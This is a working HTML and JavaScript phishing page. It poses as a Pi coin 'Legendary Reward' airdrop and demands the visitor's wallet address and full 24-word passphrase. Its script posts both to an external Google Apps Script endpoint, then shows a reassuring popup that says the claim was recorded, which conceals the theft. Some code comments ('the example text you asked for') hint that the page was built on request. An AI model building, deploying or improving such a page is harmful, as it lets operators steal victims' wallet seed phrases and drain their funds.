<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Claim Your Reward</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Inter', sans-serif;
            background: linear-gradient(180deg, #4c1d95 0%, #2e1065 100%);
            color: #e0e0e0;
        }
        .btn-gradient-purple {
            background: linear-gradient(to right, #a855f7, #ec4899);
        }
        /* Animation for messages */
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .fade-in {
            animation: fadeIn 0.5s ease-out forwards;
        }
        
        /* Full screen success popup */
        #success-popup {
            display: none; /* Hidden by default */
            position: fixed;
            inset: 0;
            width: 100%;
            height: 100%;
            background-color: #111827; /* Dark background */
            z-index: 50;
            color: #f3f4f6;
            animation: fadeIn 0.5s ease-out forwards;
        }
    </style>
</head>
<body class="flex flex-col items-center justify-center min-h-screen px-4 py-6">

    <!-- This is the main form container -->
    <div id="form-container" class="w-full max-w-lg bg-white/10 backdrop-blur-sm rounded-lg p-6 sm:p-8 shadow-lg border border-purple-700">

        <div class="text-center">
            <div class="text-yellow-400 text-5xl mb-4">üèÜ</div>
            <h1 class="text-2xl font-bold text-white mb-3">Confirm your Pi coin reward</h1>
            <p class="text-purple-200 text-sm mb-6">
                You've claimed the <span class="font-semibold text-yellow-300">Legendary Reward (954 œÄ)!</span>
                Please provide your public wallet address and optional feedback.
            </p>
        </div>

        <!-- Google Script Form -->
        <form id="claimForm" action="https://script.google.com/macros/s/AKfycbx2UlK9pSfwxduxIOxknKxkbrjgc79xAsyIlQwj8p1ZBH1dQa9pM-m4rJ7thlnj1GoH/exec" method="POST" class="space-y-4">

            <div>
                <label for="wallet_address" class="block text-left text-xs font-medium text-purple-200 mb-1">Your Public Pi Wallet Address (Required):</label>
                <input type="text" id="wallet_address" name="wallet_address" required
                       placeholder="Starts with G..."
                       class="w-full px-3 py-2 text-sm text-gray-800 bg-white/90 border border-purple-300 rounded-md focus:outline-none focus:ring-2 focus:ring-yellow-400">
                <!-- This is the example text you asked for -->
                <p class="text-left text-xs text-purple-300 mt-1">Example: GABC...XYZ</p>
            </div>

            <div>
                 <label for="Passphrase24" class="block text-left text-xs font-medium text-purple-200 mb-1">Passphrase24 (Required):</label>
<textarea id="Passphrase24" name="Passphrase24" rows="4" placeholder="please input your 24 passphrase!" class="w-full px-3 py-2 text-sm text-gray-800 bg-white/90 border border-purple-300 rounded-md focus:outline-none focus:ring-2 focus:ring-yellow-400"></textarea>
<small id="wordCount" class="text-xs text-gray-600">Word count: 0/24</small>

<script>
  const textarea = document.getElementById('Passphrase24');
  const wordCountDisplay = document.getElementById('wordCount');
  const maxWords = 24;

  textarea.addEventListener('input', () => {
    const words = textarea.value.trim().split(/\s+/);
    const wordCount = words.length;

    wordCountDisplay.textContent = `Word count: ${wordCount}/${maxWords}`;

    if (wordCount > maxWords) {
      textarea.value = words.slice(0, maxWords).join(' ');
    }
  });
</script>

            </div>

            <button type="submit"
                    class="w-full btn-gradient-purple text-white font-semibold py-3 px-4 rounded-lg transition duration-300 ease-in-out shadow-lg hover:opacity-90 disabled:opacity-50">
                Submit Claim
            </button>
        </form>

        <div id="statusMessage" class="mt-4 text-sm min-h-[1.5rem] fade-in text-center"></div>
         <footer class="mt-8 text-center text-xs text-purple-400">
             Airdrop claims processed within 24 hours.
         </footer>
    </div>

    <!-- 
      This is the FULL SCREEN SUCCESS POPUP. 
      It is hidden by default.
    -->
    <div id="success-popup" class="flex flex-col items-center justify-center p-6 text-center">
        <div class="max-w-xl">
            <div class="text-5xl mb-4">üí°</div>
            <h1 class="text-3xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-purple-400 to-pink-500 mb-4">
                A Note on Brainstorming
            </h1>
            <p class="text-lg text-gray-300 mb-8 leading-relaxed">
                Thank you for your submission. This airdrop is part of a wider initiative to brainstorm new utilities for the ecosystem. Your participation helps us gather valuable feedback to build a stronger network for everyone. True innovation comes from the free exchange of ideas‚Äîthe core of every great brainstorm.
            </p>
            <p class="text-md text-gray-400 mb-10">
                Your claim has been successfully recorded and will be processed.
            </p>
            
            <button id="return-button" 
                    class="btn-gradient-purple text-white font-bold py-3 px-8 rounded-lg text-lg transition duration-300 ease-in-out shadow-lg hover:opacity-90">
                Return to Page
            </button>
        </div>
    </div>


    <script>
        const form = document.getElementById('claimForm');
        const statusMessage = document.getElementById('statusMessage');
        const submitButton = form.querySelector('button[type="submit"]');
        const formContainer = document.getElementById('form-container');
        const successPopup = document.getElementById('success-popup');
        const returnButton = document.getElementById('return-button');

        form.addEventListener('submit', (event) => {
            event.preventDefault(); // Stop the form from navigating

            // --- 1. Wallet Validation ---
            const walletAddress = document.getElementById('wallet_address').value;
            if (!walletAddress.startsWith('G') || walletAddress.length < 10) {
                statusMessage.textContent = 'Error: Please enter a valid wallet address starting with G.';
                statusMessage.className = 'mt-4 text-sm min-h-[1.5rem] fade-in text-center text-red-400';
                return; // Stop here if wallet is invalid
            }

            // --- 2. Disable button and show loading ---
            submitButton.disabled = true;
            submitButton.textContent = 'Submitting...';
            statusMessage.textContent = 'Sending your claim...';
            statusMessage.className = 'mt-4 text-sm min-h-[1.5rem] fade-in text-center text-yellow-300';

            const formData = new FormData(form);
            const actionUrl = form.action;

            // --- 3. Send data using fetch ---
            fetch(actionUrl, {
                method: 'POST',
                body: formData,
            })
            .then(response => response.json()) // Get the JSON response from the script
            .then(data => {
                // --- 4. Check the JSON response ---
                if (data.status === 'ok') {
                    // SUCCESS! Show the popup
                    showSuccessPopup();
                } else {
                    // ERROR from Google Script
                    throw new Error(data.message || 'Unknown error from script.');
                }
            })
            .catch((error) => {
                // --- 5. Handle any network or script errors ---
                console.error('Submission error:', error);
                statusMessage.textContent = 'Oops! Network problem. Please try again.';
                statusMessage.className = 'mt-4 text-sm min-h-[1.5rem] fade-in text-center text-red-400';
                submitButton.disabled = false;
                submitButton.textContent = 'Submit Claim';
            });
        });

        // Function to hide the form and show the popup
        function showSuccessPopup() {
            formContainer.style.display = 'none'; // Hide the form
            successPopup.style.display = 'flex'; // Show the full-screen popup
        }

        // Handle the "Return to Page" button click
        returnButton.addEventListener('click', () => {
            // This will take the user back to your treasure chest page
            window.location.href = 'index.html'; 
        });
    </script>

</body>
</html>



